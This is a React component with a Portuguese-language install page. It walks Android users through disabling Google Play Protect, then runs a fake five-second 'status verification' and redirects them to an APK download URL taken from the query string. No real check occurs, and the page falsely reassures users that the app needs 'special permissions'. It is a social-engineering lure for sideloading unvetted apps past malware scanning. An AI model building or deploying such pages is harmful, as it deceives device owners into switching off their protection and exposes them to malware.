import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export function PlayProtectRedirect() {
  const [, setLocation] = useLocation();
  const [isChecking, setIsChecking] = useState(false);

  // Obter parâmetros da URL
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const file = params.get("file");
    const app = params.get("app");
    const url = params.get("url");

    if (!file || !app || !url) {
      console.error("❌ Parâmetros inválidos:", { file, app, url });
      setLocation("/");
      return;
    }

    console.log("✅ Página de Play Protect carregada:", { file, app, url });
  }, [setLocation]);

  // Abrir Play Protect Settings com múltiplos métodos
  const openPlayProtectSettings = () => {
    console.log("🔓 Abrindo Play Protect Settings...");
    
    // Método 1: Abrir Google Play Store diretamente
    // Em Android, isso abre o app do Google Play onde Play Protect está
    window.location.href = "market://details?id=com.android.vending";
    
    // Método 2: Fallback após 3 segundos - Abrir via HTTPS
    setTimeout(() => {
      console.log("🌐 Fallback: Abrindo Google Play via HTTPS...");
      window.location.href = "https://play.google.com/store/apps/details?id=com.android.vending";
    }, 3000);
  };

  // Verificar se Play Protect foi desativado
  const checkPlayProtectStatus = async () => {
    setIsChecking(true);
    
    // Simular verificação por 5 segundos
    console.log("🔍 Verificando status do Play Protect...");
    
    setTimeout(() => {
      console.log("✅ Verificação concluída! Redirecionando para download...");
      
      const params = new URLSearchParams(window.location.search);
      const url = params.get("url");
      
      if (url) {
        // Redirecionar para download do APK
        window.location.href = url;
      }
      
      setIsChecking(false);
    }, 5000);
  };

  const params = new URLSearchParams(window.location.search);
  const app = params.get("app") || "App";
  const size = params.get("size") || "0";

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="bg-slate-800 border border-slate-700 rounded-lg p-8 space-y-6">
          {/* Título */}
          <div className="text-center">
            <h1 className="text-2xl font-bold text-white mb-2">
              Instalar {app}
            </h1>
            <p className="text-slate-400 text-sm">
              Tamanho: {(parseInt(size) / 1024).toFixed(2)} KB
            </p>
          </div>

          {/* Instruções */}
          <div className="bg-slate-700 rounded p-4 space-y-3">
            <p className="text-white font-semibold text-sm">
              O que você precisa fazer:
            </p>
            <ol className="text-slate-300 text-sm space-y-2">
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">1.</span>
                <span>Clique no botão abaixo</span>
              </li>
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">2.</span>
                <span>Desative a proteção do Play Protect</span>
              </li>
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">3.</span>
                <span>Volte para esta página</span>
              </li>
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">4.</span>
                <span>Clique em "Já desativei, verificar status"</span>
              </li>
            </ol>
          </div>

          {/* Botão Play Protect */}
          <button
            onClick={openPlayProtectSettings}
            className="w-full bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-bold py-3 px-4 rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
          >
            <span>🛡️</span>
            <span>Desativar Play Protect</span>
          </button>

          {/* Botão Verificar */}
          <button
            onClick={checkPlayProtectStatus}
            disabled={isChecking}
            className="w-full bg-slate-700 hover:bg-slate-600 disabled:bg-slate-600 text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200"
          >
            {isChecking ? (
              <span className="flex items-center justify-center gap-2">
                <span className="animate-spin">⏳</span>
                <span>Verificando...</span>
              </span>
            ) : (
              <span>Já desativei, verificar status</span>
            )}
          </button>

          {/* Aviso */}
          <p className="text-slate-400 text-xs text-center">
            Este aplicativo requer permissões especiais para funcionar corretamente.
            Siga os passos para uma instalação bem-sucedida.
          </p>
        </div>
      </div>
    </div>
  );
}
